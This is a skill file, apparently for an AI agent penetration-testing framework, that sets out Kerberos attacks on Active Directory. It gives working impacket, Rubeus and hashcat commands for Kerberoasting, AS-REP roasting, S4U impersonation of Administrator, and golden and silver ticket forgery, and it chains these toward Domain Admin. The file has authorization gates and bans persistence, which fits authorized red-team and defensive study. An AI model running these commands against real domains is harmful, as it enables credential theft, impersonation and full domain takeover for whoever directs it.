---
name: attack-kerberos
description: Kerberos authentication abuse against a reachable AD — Kerberoasting, AS-REP roasting, S4U, TGT delegation, unconstrained-delegation harvesting, ticket forgery (silver/golden/diamond/sapphire). Converts domain creds / shell-on-DC into additional creds, ServicePrincipal access, and ultimately admin:<domain>.
category: post-foothold
tags: [kerberos, kerberoasting, asreproast, s4u, delegation, golden-ticket, silver-ticket]
cwe_ids: [CWE-287, CWE-294, CWE-640]
chains_with: [attack-ad-recon, attack-adcs, attack-lateral, attack-loot]
tools: [impacket, rubeus, bloodyAD, netexec, leash-foothold.sh]
version: "1.0"
---

# Kerberos abuse (post-foothold AD)

## Objective
Turn a weak-password SPN account or an `UF_DONT_REQUIRE_PREAUTH` user, OR a controlled service
account with delegation, OR a stolen krbtgt hash, into **creds / tickets** that unlock the next hop in
the AD graph. ATT&CK T1558.003 / T1558.004 / T1550.003 / T1134.002 / T1134.005.

## Gate
- `stage: post-foothold`
- `requires: ["creds:<p>@<dc>"]`  (minimum — enough to query LDAP for SPNs)
- Milestone-tier gates:
  - **Golden Ticket** needs `admin:<domain>` + `krbtgt` NTLM — a demonstration proof, NEVER a
    persistence backdoor.
  - **Diamond/Sapphire Ticket** needs admin on the DC — same discipline.
- Operator GO required for anything beyond read-only roasting.

## Methodology — four distinct Kerberos abuses

### 1. Kerberoasting (SPN-weak-password; cheapest)
Any domain user may request a TGS for any SPN; the TGS part encrypted with the service account's NT
hash is offline-crackable.
```bash
bin/.pyenv/Scripts/GetUserSPNs.py "<DOM>/<user>:<pwd>" -dc-ip <DC-IP> -request \
  -outputfile targets/<t>/raw/attack-kerberos/kerberoast.hash
# Then crack offline:
hashcat -m 13100 kerberoast.hash /path/wordlist.txt
```
Rubeus equivalent on Windows:
```powershell
.\Rubeus.exe kerberoast /outfile:kerberoast.hash /nowrap /format:hashcat
```

### 2. AS-REP roasting (users with `DONT_REQ_PREAUTH`)
```bash
bin/.pyenv/Scripts/GetNPUsers.py "<DOM>/" -usersfile <users.txt> -no-pass -dc-ip <DC-IP> -format hashcat \
  -outputfile targets/<t>/raw/attack-kerberos/asrep.hash
# hashcat -m 18200 asrep.hash wordlist.txt
```

### 3. S4U delegation abuse (`S4U2Self` → `S4U2Proxy`)
If we hold a service account with constrained delegation **or** generic-write on a user, we can
mint a ticket as any user on the delegated service.
```bash
bin/.pyenv/Scripts/getST.py -spn cifs/<target.fqdn> -impersonate Administrator "<DOM>/<svc>:<pwd>"
# Resulting .ccache ticket: KRB5CCNAME=... bin/.pyenv/Scripts/psexec.py -k -no-pass <DOM>/<target>
```
Unconstrained delegation (`TrustedToAuthForDelegation`) + a coerce (PetitPotam/PrinterBug) chains
into Domain Admin — see .claude/skills/attack/relay/SKILL.md.

### 4. Ticket forgery (admin-level, demonstration only)
- Golden Ticket: `ticketer.py -nthash <krbtgt> -domain-sid <SID> -domain <DOM> administrator` — proves
  domain compromise, we DO NOT keep as persistence per Spider doctrine.
- Silver Ticket: `ticketer.py -nthash <svc_hash> -domain-sid <SID> -domain <DOM> -spn <SPN> administrator`
  — demonstrates service compromise once the hash is held.
- Diamond/Sapphire (newer): require `admin on DC` + specific tooling (Rubeus `/diamond`).

## Oracle
- Kerberoasting / AS-REP success — **non-null hashes written + offline crack produces a cleartext**.
  Cleartext goes into `state.json.creds[]` (not the hash — the hash is intermediate).
- S4U / Silver / Golden — **a `klist` on a lab-equivalent target host shows the forged ticket AND an
  authenticated action against the impersonated service succeeds** (e.g., `nxc smb` with the
  `-k --use-kcache` prefix returning `Pwn3d!`).

## Forbidden
- Krbtgt rotation / RBCD DACL changes beyond the single demonstration — never leave a persistent
  Kerberos backdoor.
- Password-spraying through Kerberos pre-auth is a cred-access variant — gate on
  `scope.policies.default_cred_control_test.enabled` and run through `tools/leash-cred.sh` only.

## Chaining
- `creds:<svc>@<dom>` (from roasting) → may unlock `admin:<host>` if the service runs with high
  privileges; feeds `attack-lateral`.
- `admin:<domain>` ⟷ `attack-adcs` (ESC8/ESC11 use NTLM relay to ADCS, admin cert chains to DA).
